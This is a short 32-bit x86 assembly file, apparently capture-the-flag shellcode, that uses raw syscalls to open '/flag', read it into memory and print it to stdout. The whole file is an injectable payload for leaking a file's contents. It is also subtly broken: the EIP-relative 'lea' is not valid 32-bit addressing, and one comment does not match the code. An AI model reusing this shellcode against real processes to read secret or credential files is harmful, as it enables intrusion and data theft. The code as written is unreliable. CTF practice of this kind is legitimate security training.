.intel_syntax noprefix

.section .text
.global _start

_start:
    # flag_fd = open('/flag', $esp)
    lea ebx, [eip+flag]
    xor ecx, ecx
    xor edx, edx
    mov eax, 5
    int 0x80

    # read(flag_fd, 0x1337200, 0x50)
    mov ebx, eax
    mov ecx, 0x1337200
    mov edx, 0x50
    mov eax, 3
    int 0x80

    # write(1, 0x1337200, 0x50)
    mov ebx, 1
    mov ecx, 0x1337200
    mov edx, 0x50
    mov eax, 4
    int 0x80

flag:
    .ascii "/flag\0"
